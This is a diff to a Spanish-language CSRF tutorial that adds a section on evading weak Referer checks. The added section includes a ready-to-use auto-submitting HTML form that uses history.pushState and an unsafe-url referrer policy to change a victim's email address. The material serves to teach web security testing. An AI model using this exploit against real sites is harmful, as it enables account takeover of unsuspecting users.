@@ -17,9 +17,9 @@ Ataques CSRF (Cross-site request forgery) o falsificación de petición en sitio
 4. [El token CSRF no está vinculado a la sesión del usuario](#CSRFnoVinculado)<br>
    4.1. [Mismo token entre usuarios](#MismoTokenUsuarios)<br>
    4.2. [Token no vinculado a la sesion](#SesionTokenNoVinculado)
-6. [El token se duplica en la cookie](#TokenDuplicaCooki)
-5. [CSRF sin Referrer](#CSRFsinReferrere)
-
+5. [El token se duplica en la cookie](#TokenDuplicaCookie)
+6. [CSRF sin Referrer](#CSRFsinReferrer)
+7. [Validacion del Referer rota](#CSRFRefererRoto)
 
 ---
 
@@ -130,5 +130,47 @@ Indicamos que no exista el Referer en el exploit del CSRF usando el tag de meta.
 </form> 
    <script>document.forms[0].submit();</script>
 </body>
+</html>
+```
+
+
+---
+### CSRF con validacion del Referer rota <a name="CSRFRefererRoto"></a>
+
+La pagina valida el referrer cuando queremos cambiar de correo, **se fija si el referer incluye el dominio de la pagina origen.**
+Modificando el referer con javascript podemos evadir esta validacion y poder explotar el CSRF.
+
+**Modificar el Referer:**
+ - Usando esta funcion de javascript `history.pushState()` que agrega una entrada a la pila del historial de sesiones del navegador.
+```html
+<script>history.pushState("", "", "/?vulnerable-web.com")</script>
+```
+- Validacion del referer acepta cualquier encabezado que contenga el dominio esperado en algún lugar de la cadena
+```html
+Referer: https://atacante-web.com/?vulnerable-web.com
+```
+
+**Referrer-Policy**
+- Muchos navegadores ahora eliminan la cadena de consulta del encabezado Referrer de forma predeterminada como medida de seguridad. Para anular este comportamiento y asegurarnos de que la URL completa se incluya en la solicitud.
+- Tenemos que añadir en el encabezado "Referrer-Policy: unsafe-url"
+```html
+<meta name="referrer" content="unsafe-url" />
+```
+
+```html
+<html>
+<head>
+<meta name="referrer" content="unsafe-url" />
+</head>
+  <body> 
+  <script>
+history.pushState("", "", "/?vulnerable-web.com")
+    </script>
+    <form action="https://vulnerable-web.com/email/change" method="POST">
+      <input type="hidden" name="email" value="pwned@gmail.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.forms[0].submit();</script>
+  </body>
 </html>
 ```
